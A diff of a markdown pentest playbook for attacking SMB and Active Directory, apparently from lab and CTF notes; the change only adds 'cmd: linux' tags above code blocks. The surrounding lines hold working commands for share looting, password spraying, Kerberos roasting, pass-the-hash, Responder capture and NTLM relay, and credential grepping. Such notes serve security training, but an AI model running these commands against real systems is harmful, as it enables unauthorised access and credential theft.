@@ -19,6 +19,7 @@ SMB is the cluster of ports:
 | 137/udp | NetBIOS Name Service |
 | 138/udp | NetBIOS Datagram |
 
+<!-- cmd: linux -->
 ```bash
 nmap -sS -p139,445 $TARGET                                 # [USED]
 nmap -sV -p139,445 --script smb-protocols,smb-os-discovery,smb2-security-mode,smb-enum-shares,smb-enum-users $TARGET
@@ -31,6 +32,7 @@ nmap --script "safe and smb-*" -p139,445 $TARGET
 
 ## 1. Banner & Signing
 
+<!-- cmd: linux -->
 ```bash
 netexec smb $TARGET                                        # [USED]
 ```
@@ -45,6 +47,7 @@ What to read off the banner line:
 | Domain / workgroup name | Feeds /etc/hosts, BloodHound |
 
 EternalBlue quick-check:
+<!-- cmd: linux -->
 ```bash
 nmap -p445 --script smb-vuln-ms17-010 $TARGET
 ```
@@ -53,6 +56,7 @@ nmap -p445 --script smb-vuln-ms17-010 $TARGET
 
 ## 2. Anonymous / Guest Triage
 
+<!-- cmd: linux -->
 ```bash
 # Null
 netexec smb $TARGET -u '' -p '' --shares                    # [USED]
@@ -72,6 +76,7 @@ Outputs to note:
 | `STATUS_ACCESS_DENIED` | Still probe individual shares by name (`\software$`, `\backup`) |
 
 ### Full enum4linux sweep
+<!-- cmd: linux -->
 ```bash
 enum4linux -a $TARGET                                       # [USED — VulnNet, SoupedeCode]
 ```
@@ -84,6 +89,7 @@ enum4linux -a $TARGET                                       # [USED — VulnNet,
 
 Once you have credentials:
 
+<!-- cmd: linux -->
 ```bash
 netexec smb $TARGET -u <USER> -p '<PASS>' --shares          # [USED — Logging, Overwatch]
 smbmap -H $TARGET -u <USER> -p '<PASS>' -r                  # [USED — SoupedeCode 01]
@@ -91,6 +97,7 @@ smbclient -L //$TARGET/ -U '<USER>%<PASS>'
 ```
 
 ### Download a whole share
+<!-- cmd: linux -->
 ```bash
 smbclient //$TARGET/SHARE -U '<USER>%<PASS>' \
   -c "recurse ON; prompt OFF; cd <subpath>; mget *"          # [USED — Overwatch SYSVOL]
@@ -116,6 +123,7 @@ smbclient //$TARGET/SHARE -U '<USER>%<PASS>' \
 When you have at least guest or a valid user, LSA / SAMR over `IPC$` gives user / group / policy info without file shares.
 
 ### rpcclient
+<!-- cmd: linux -->
 ```bash
 rpcclient -U '<USER>%<PASS>' $TARGET
 > enumdomusers                                              # requires SAMR access
@@ -128,6 +136,7 @@ rpcclient -U '<USER>%<PASS>' $TARGET
 ```
 
 ### netexec full user / group enum
+<!-- cmd: linux -->
 ```bash
 netexec smb $TARGET -u <USER> -p '<PASS>' --users
 netexec smb $TARGET -u <USER> -p '<PASS>' --groups
@@ -136,6 +145,7 @@ netexec smb $TARGET -u <USER> -p '<PASS>' --pass-pol
 ```
 
 ### RID brute (guest / null path when `enumdomusers` is blocked)
+<!-- cmd: linux -->
 ```bash
 netexec smb $TARGET -u guest -p '' --rid-brute              # [USED — SoupedeCode 01]
 impacket-lookupsid guest@$TARGET
@@ -148,12 +158,14 @@ See [RID brute-force playbook](rid-brute-enumeration.md).
 ## 5. Password Spraying
 
 ### User == password
+<!-- cmd: linux -->
 ```bash
 nxc smb $TARGET -u usernames.txt -p usernames.txt \
   --no-brute --continue-on-success                          # [USED — SoupedeCode 01]
 ```
 
 ### Common policy passwords
+<!-- cmd: linux -->
 ```bash
 nxc smb $TARGET -u usernames.txt -p 'Welcome123' --continue-on-success
 nxc smb $TARGET -u usernames.txt -p 'Password1' --continue-on-success
@@ -161,6 +173,7 @@ nxc smb $TARGET -u usernames.txt -p 'Summer2025!' --continue-on-success
 ```
 
 ### Kerbrute (less noisy for account lockout — AS-REQ pre-auth only)
+<!-- cmd: linux -->
 ```bash
 kerbrute passwordspray --dc $TARGET -d <DOMAIN> usernames.txt 'Welcome2026@'
 ```
@@ -171,6 +184,7 @@ See [password-spraying.md](password-spraying.md).
 
 ## 6. AS-REP Roast / Kerberoast (once you have one valid account)
 
+<!-- cmd: linux -->
 ```bash
 impacket-GetNPUsers -dc-ip $TARGET <DOMAIN>/ -usersfile usernames.txt -format hashcat -outputfile asreproast.txt
 
@@ -185,6 +199,7 @@ See [kerberos-roasting.md](kerberos-roasting.md).
 
 With an NT hash instead of a password:
 
+<!-- cmd: linux -->
 ```bash
 netexec smb $TARGET -u <USER> -H ':<NT_HASH>' --shares
 smbclient //$TARGET/SHARE -U '<DOMAIN>\<USER>' --pw-nt-hash '<NT_HASH>'
@@ -199,6 +214,7 @@ evil-winrm -i $TARGET -u '<USER>' -H '<NT_HASH>'                    # [USED — 
 
 Respond on a name, capture NetNTLMv2, relay:
 
+<!-- cmd: linux -->
 ```bash
 # Capture
 sudo responder -I <iface>                                            # [USED — Overwatch]
@@ -213,6 +229,7 @@ impacket-ntlmrelayx -tf targets.txt -smb2support --no-http-server
 
 After mirroring a share locally:
 
+<!-- cmd: linux -->
 ```bash
 # Credential hunt
 grep -rEi 'password|passwd|pwd|secret|token|connectionstring' ./loot/
@@ -252,6 +269,7 @@ See [binary-credential-hunting.md](../creds/binary-credential-hunting.md).
 
 Use this when you just want to blast a box:
 
+<!-- cmd: linux -->
 ```bash
 TARGET=<ip>; DOMAIN=<domain>; USER=<user>; PASS=<pass>
 
